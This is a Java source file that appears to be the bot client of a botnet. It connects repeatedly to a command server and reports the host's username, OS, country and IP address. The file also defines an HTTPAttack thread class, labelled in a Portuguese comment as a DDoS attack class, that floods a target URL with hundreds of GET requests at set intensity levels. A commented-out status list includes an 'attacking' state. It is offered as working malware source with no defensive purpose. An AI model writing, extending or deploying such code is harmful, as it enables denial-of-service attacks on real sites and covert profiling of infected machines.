package br.com.pricher.server.core;

import br.com.pricher.server.messages.Message;
import br.com.pricher.server.messages.MessageType;
import br.com.pricher.server.messages.Status;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;

/**
 * Created by Douglas Giovanella on 31/07/2017.
 */
public class Client {

    private static final String HASCONNECTED = "has connected";

    private Socket socket;
    private BufferedWriter bfw;
    private static ObjectOutputStream oos;
    public String hostname;
    public int port;
    public String username;
    public String SOName;
    public String SOCountry;
    public InetAddress ipAddress;
    private InputStream is;
    private ObjectInputStream input;
    private OutputStream outputStream;

    public Client(String hostname, int port, String username, String SOName, String SOCountry, InetAddress ipAddress) {
        this.hostname = hostname;
        this.port = port;
        this.username = username;
        this.SOName = SOName;
        this.SOCountry = SOCountry;
        this.ipAddress = ipAddress;
    }

    public static void main(String[] args) throws IOException {
        Client app = new Client(
                "localhost",
                8094,
                System.getProperty("user.name"),
                System.getProperty("os.name"),
                System.getProperty("user.country"),
                InetAddress.getLocalHost());
        app.connect();
    }

    private void connect() throws IOException {
        do {
            try {
                socket = new Socket(hostname, port);
                outputStream = socket.getOutputStream();
                oos = new ObjectOutputStream(outputStream);
                is = socket.getInputStream();
                input = new ObjectInputStream(is);
            } catch (IOException e) {
                System.err.println("Could not connect to server");
            }
        } while (socket == null);

        System.out.println("Connection accepted " + socket.getInetAddress() + ":" + socket.getPort());

        try {
            connectMsg();
            System.out.println("Sockets in and out ready!");
            while (socket.isConnected()) {
                Message message = null;
                message = (Message) input.readObject();

                if (message != null) {
                    System.out.println("Messsage received:" + message.getMsg() + " MessageType:" + message.getType() + "Name:" + message.getName());
                    switch (message.getType()) {
                        case NOTIFICATION:
                            break;
                        case DISCONNECTED:
                            break;
                        case STATUS:
                            break;
                    }
                }
            }
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /***
     * Método usado para enviar mensagem para o server socket
     * @param msg do tipo String
     * @throws IOException retorna IO Exception caso dê algum erro.
     */
    private void sendMessage(String msg) throws IOException {
        Message createMessage = new Message();
        createMessage.setName(username);
        createMessage.setType(MessageType.USER);
        createMessage.setMsg(msg);
        oos.writeObject(createMessage);
        oos.flush();
    }

    public void sendStatusUpdate(Status status) throws IOException {
        Message createMessage = new Message();
        createMessage.setName(username);
        createMessage.setType(MessageType.STATUS);
        createMessage.setStatus(status);
        oos.writeObject(createMessage);
        oos.flush();
    }

    /* esse método is usado para enviar a mensagem de conexao */
    public void connectMsg() throws IOException {
        Message createMessage = new Message();
        createMessage.setName(username);
        createMessage.setType(MessageType.CONNECTED);
        createMessage.setMsg(HASCONNECTED);
        createMessage.setCountry(this.SOCountry);
        createMessage.setOSName(this.SOName);
        createMessage.setIpAddress(this.ipAddress);
        oos.writeObject(createMessage);
    }
}


/**
 * Classe de ataque DDOS
 */
class HTTPAttack extends Thread {
    private static final int LOW = 1;
    private static final int MEDIUM = 2;
    private static final int HIGH = 3;

    private static final int REQUEST_LOW = 100;
    private static final int REQUEST_MEDIUM = 200;
    private static final int REQUEST_HIGH = 500;

    private URL url;
    private int intensity;

    HTTPAttack(String url, int intensity) {
        try {
            this.url = new URL(url);
            this.intensity = intensity;
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }

    private static int getNumRequest(int intensity) {
        switch (intensity) {
            case LOW:
                return REQUEST_LOW;
            case MEDIUM:
                return REQUEST_MEDIUM;
            default:
                return REQUEST_HIGH;
        }
    }

    public void run() {
        int i = 0;
        int request = getNumRequest(this.intensity);
        while (i < request) {
            try {
                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
                conn.setAllowUserInteraction(true);
                conn.setConnectTimeout(5000); // 15 sec. connection timeout
                conn.setDoInput(true);
                conn.setDoOutput(false);
                conn.setUseCaches(false);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");

                conn.connect();
                conn.getResponseCode();
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }
            i++;
        }
    }
}

///**
// * Classe para enviar mensagens
// */
//class Message implements Serializable {
//    private String name;
//    private MessageType type;
//    private String msg;
//    private Status status;
//
//    private String Country;
//    private String OSName;
//    private InetAddress ipAddress;
//
//    public String getCountry() {
//        return Country;
//    }
//
//    public void setCountry(String country) {
//        Country = country;
//    }
//
//    public String getOSName() {
//        return OSName;
//    }
//
//    public void setOSName(String OSName) {
//        this.OSName = OSName;
//    }
//
//    public InetAddress getIpAddress() {
//        return ipAddress;
//    }
//
//    public void setIpAddress(InetAddress ipAddress) {
//        this.ipAddress = ipAddress;
//    }
//
//    public String getName() {
//        return name;
//    }
//
//    public void setName(String name) {
//        this.name = name;
//    }
//
//    public MessageType getType() {
//        return type;
//    }
//
//    public void setType(MessageType type) {
//        this.type = type;
//    }
//
//    public String getMsg() {
//        return msg;
//    }
//
//    public void setMsg(String msg) {
//        this.msg = msg;
//    }
//
//    public Status getStatus() {
//        return status;
//    }
//
//    public void setStatus(Status status) {
//        this.status = status;
//    }
//}
//
//enum MessageType {
//    DISCONNECTED, CONNECTED, STATUS, USER, SERVER, NOTIFICATION
//}
//
//enum Status {
//    REALIZANDO_TAREFA, PARADO, DESCONECTADO, ATACANDO, ACESSANDO_SITE
//}
